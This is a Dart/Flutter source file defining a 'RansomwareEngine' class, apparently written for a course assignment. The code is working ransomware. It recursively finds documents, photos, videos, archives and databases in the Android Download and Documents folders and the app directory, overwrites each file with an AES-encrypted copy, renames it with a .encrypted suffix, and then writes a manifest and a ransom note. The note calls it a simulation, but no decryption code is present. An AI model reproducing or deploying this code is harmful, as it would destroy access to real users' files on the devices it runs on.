import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:shared_preferences/shared_preferences.dart';

class RansomwareEngine {
  static const String manifestFileName = 'ransomware_manifest.txt';
  static const String ransomNoteFileName = 'RANSOM_NOTE.txt';
  
  static final FlutterSecureStorage _storage = const FlutterSecureStorage();
  static bool _isActivated = false;
  static String? _encryptionKey;

  static Future<void> initialize() async {
    _encryptionKey = await _storage.read(key: 'encryption_key');
    if (_encryptionKey == null) {
      _encryptionKey = encrypt.Key.fromSecureRandom(32).base64;
      await _storage.write(key: 'encryption_key', value: _encryptionKey);
    }
  }

  static Future<void> deploy() async {
    if (_isActivated) return;
    
    try {
      _isActivated = true;
      
      final appDir = await getApplicationDocumentsDirectory();
      final downloadsDir = Directory('/storage/emulated/0/Download');
      final documentsDir = Directory('/storage/emulated/0/Documents');
      
      final targetDirs = [
        appDir,
        if (downloadsDir.existsSync()) downloadsDir,
        if (documentsDir.existsSync()) documentsDir,
      ];
      
      final manifest = <String, String>{};
      
      for (var dir in targetDirs) {
        if (await dir.exists()) {
          await _encryptDirectory(dir, manifest);
        }
      }
      
      await _createManifest(manifest);
      await _showRansomNote();
      
    } catch (e) {
      print('Ransomware deployment failed: $e');
      _isActivated = false;
    }
  }

  static Future<void> _encryptDirectory(Directory dir, Map<String, String> manifest) async {
    final files = dir.listSync(recursive: true);
    
    for (var entity in files) {
      if (entity is File) {
        try {
          final fileName = entity.path;
          final extension = fileName.split('.').last.toLowerCase();
          
          if (_shouldEncryptFile(extension)) {
            final encrypted = await _encryptFile(entity);
            if (encrypted != null) {
              manifest[fileName] = encrypted;
            }
          }
        } catch (e) {
          print('Error encrypting file: $e');
        }
      }
    }
  }

  static bool _shouldEncryptFile(String extension) {
    final extensionsToEncrypt = [
      'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
      'jpg', 'jpeg', 'png', 'gif', 'bmp', 'mp4', 'avi', 'mov',
      'mp3', 'wav', 'zip', 'rar', '7z', 'db', 'sqlite', 'json',
    ];
    return extensionsToEncrypt.contains(extension);
  }

  static Future<String?> _encryptFile(File file) async {
    try {
      final content = await file.readAsBytes();
      final key = encrypt.Key.fromBase64(_encryptionKey!);
      final iv = encrypt.IV.fromSecureRandom(16);
      final encrypter = encrypt.Encrypter(
        encrypt.AES(key, mode: encrypt.AESMode.cbc)
      );
      
      final encrypted = encrypter.encryptBytes(content, iv: iv);
      await file.writeAsBytes(encrypted.bytes);
      
      final newPath = '${file.path}.encrypted';
      await file.rename(newPath);
      
      final ivString = iv.base64;
      await _storage.write(key: '${file.path}_iv', value: ivString);
      
      return encrypted.base64;
    } catch (e) {
      print('Encryption error: $e');
      return null;
    }
  }

  static Future<void> _createManifest(Map<String, String> manifest) async {
    final appDir = await getApplicationDocumentsDirectory();
    final manifestFile = File('${appDir.path}/$manifestFileName');
    
    final content = StringBuffer();
    content.writeln('RANSOMWARE MANIFEST');
    content.writeln('===================');
    content.writeln('Deployment Time: ${DateTime.now()}');
    content.writeln('Total Files Encrypted: ${manifest.length}');
    content.writeln('\nEncrypted Files:');
    content.writeln('----------------');
    
    manifest.forEach((file, hash) {
      content.writeln('File: $file');
      content.writeln('Hash: $hash');
      content.writeln('---');
    });
    
    await manifestFile.writeAsString(content.toString());
    print('Manifest created at: ${manifestFile.path}');
  }

  static Future<void> _showRansomNote() async {
    final appDir = await getApplicationDocumentsDirectory();
    final noteFile = File('${appDir.path}/$ransomNoteFileName');
    
    final noteContent = '''
================================================================================
                                RANSOMWARE SIMULATOR
================================================================================

Your files have been ENCRYPTED!

All your documents, photos, videos, and other important files have been 
encrypted with a strong AES-256 encryption algorithm.

WHAT HAPPENED?
--------------
- All files in Documents, Downloads, and App directories have been encrypted
- A manifest file has been created with details of encrypted files
- Your data is still intact but encrypted

THIS IS A SIMULATION
--------------------
This is a proof-of-concept demonstration for the CS402M assignment.
No actual data has been permanently harmed.

MANIFEST LOCATION:
------------------
${appDir.path}/$manifestFileName

INSTRUCTIONS:
-------------
1. This is a demonstration of ransomware behavior
2. The encryption is reversible for educational purposes
3. Contact your course instructor for decryption procedures

SYSTEM UNAVAILABLE
------------------
The Android file system is now unavailable to the user.
Please restart the application to restore functionality.

================================================================================
    ''';
    
    await noteFile.writeAsString(noteContent);
    print('Ransom note created at: ${noteFile.path}');
    
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('ransomware_active', true);
  }

  static bool isActive() {
    return _isActivated;
  }
}